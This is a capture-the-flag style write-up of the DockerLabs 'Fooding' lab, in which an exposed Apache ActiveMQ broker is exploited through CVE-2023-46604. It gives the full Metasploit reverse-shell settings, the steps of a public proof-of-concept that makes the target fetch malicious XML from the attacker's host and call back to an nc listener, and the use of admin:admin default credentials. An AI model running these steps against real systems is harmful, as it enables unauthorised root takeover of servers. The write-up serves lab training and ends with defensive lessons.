# Fooding - DockerLabs - Easy

## Summary

**Fooding** is an easy Linux machine from DockerLabs running Apache ActiveMQ 5.15.15. The box is vulnerable to **CVE-2023-46604**, an unauthenticated remote code execution in the OpenWire protocol, which grants a root shell directly on first exploitation — no privilege escalation chain required.

---

## Tools

- `nmap` — port and service enumeration
- Web browser — ActiveMQ web console access
- Metasploit Framework — initial (unsuccessful) exploitation attempt
- `tcpdump` — network traffic verification
- [`CVE-2023-46604-ActiveMQ-RCE-Python`](https://github.com/strikoder/CVE-2023-46604-ActiveMQ-RCE-Python) — public PoC used for final exploitation
- `nc` — reverse shell listener

## 1. Enumeration

### Port Scan

```bash
nmap -sC -sV -p- 172.17.0.2
```

Open ports:
- **80/tcp** — Apache httpd 2.4.59 (default page)
- **443/tcp** — Apache httpd 2.4.59 (DockerLabs template)
- **1883/tcp** — MQTT
- **5672/tcp** — AMQP
- **8161/tcp** — Jetty 9.4.39 — HTTP 401, `WWW-Authenticate: Basic realm="ActiveMQRealm"`
- **40131/tcp** — tcpwrapped
- **61613/tcp** — STOMP (Apache ActiveMQ)
- **61614/tcp** — Jetty 9.4.39 (HTTP)
- **61616/tcp** — ActiveMQ OpenWire transport **5.15.15**

The combination of ports (1883, 5672, 8161, 61613, 61616) and the OpenWire banner immediately identifies **Apache ActiveMQ**.

### Web Console Access

```
http://172.17.0.2:8161/index.html
```

Logged in with default credentials:

```
admin:admin
```

Confirmed access to the ActiveMQ web console ("Welcome to the Apache ActiveMQ!").

## 2. Exploitation

### Vulnerability Identification

ActiveMQ **5.15.15** is vulnerable to **CVE-2023-46604** — an unauthenticated RCE in the OpenWire protocol (port 61616), caused by unsafe class instantiation via `ClassPathXmlApplicationContext` when deserializing a crafted `ExceptionResponse` packet. No credentials are required for this vector (the 8161 admin login was a red herring / not needed for the final exploit).

### Attempt 1 — Metasploit (partial success, no session)

```
use exploit/multi/misc/apache_activemq_rce_cve_2023_46604
set RHOSTS 172.17.0.2
set RPORT 61616
set TARGET Linux
set PAYLOAD cmd/linux/http/x64/shell_reverse_tcp
set LHOST 172.17.0.1
set LPORT 4444
run
```

Result: module confirmed the target as vulnerable and the malicious XML was fetched twice by the target (verified independently with `tcpdump`), but no reverse shell callback was ever received — likely an issue with the staged `cmd/linux/http/*` payload's secondary fetch inside the container.

```bash
sudo tcpdump -i any port 4444 or port 8081 -n
```
Confirmed: `172.17.0.2` successfully fetched the XML payload from the Metasploit web server (2 full GET/response cycles on port 8081), but zero traffic ever hit port 4444.

### Attempt 2 — Hand-crafted OpenWire packet (failed)

A manually constructed raw OpenWire frame was sent directly via a custom Python socket script. No HTTP request was ever received on the attacker's server — the frame was malformed and rejected by the broker without triggering the vulnerable code path. Abandoned in favor of a verified public PoC.

### Attempt 3 — Public PoC (success)

```bash
git clone https://github.com/strikoder/CVE-2023-46604-ActiveMQ-RCE-Python.git
cd CVE-2023-46604-ActiveMQ-RCE-Python
```

```bash
# 1. Listener
nc -nvlp 1001
```

```bash
# 2. Generate the malicious XML, pointing back to the listener
python3 generate_poc.py -i 172.17.0.1 -p 1001
```

```bash
# 3. Serve the XML over HTTP
python3 -m http.server 2002
```

```bash
# 4. Trigger the exploit against the OpenWire port
python3 main.py -i 172.17.0.2 -u http://172.17.0.1:2002/poc-linux.xml
```

Result: immediate reverse shell, landing **directly as root**:

```
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 36646
root@5fd494ba63cd:/#
```

No privilege escalation was needed — the ActiveMQ process itself was running as root inside the container.

## 3. Shell Stabilization

The container had no `python3` available for the usual PTY upgrade. Alternative used:

```bash
script /dev/null -c bash
```
```
Ctrl+Z
```
```bash
stty raw -echo; fg
```
```bash
export TERM=xterm
reset
```

(Fallback options if `script` is unavailable: `perl -e 'exec "/bin/bash";'`, or `socat` if present on the target.)

## 4. Lessons Learned

1. **ActiveMQ's OpenWire port (61616) should never be exposed** — CVE-2023-46604 is unauthenticated RCE with public, reliable PoCs; the web console credentials (8161) are irrelevant to this vector.
2. **Hand-rolling a protocol exploit from memory is risky** — a malformed packet can fail silently with zero network traffic, wasting time on a dead end that looks like a network problem. Verifying with `tcpdump` early (confirming the XML fetch succeeds) helps isolate whether the issue is delivery or payload execution.
3. **Staged Metasploit payloads (`cmd/linux/http/*`) can fail in constrained container environments** even when the initial exploit stage lands correctly — a public, actively maintained PoC is often more reliable than the framework module for less common protocols.
4. **A service running as root inside a container collapses the privilege escalation phase entirely** — initial access *is* root access.
5. **Default credentials (`admin:admin`) on ActiveMQ's web console are a real, common finding**, even if unused in this specific attack chain — always check and report them regardless of the final exploitation path.
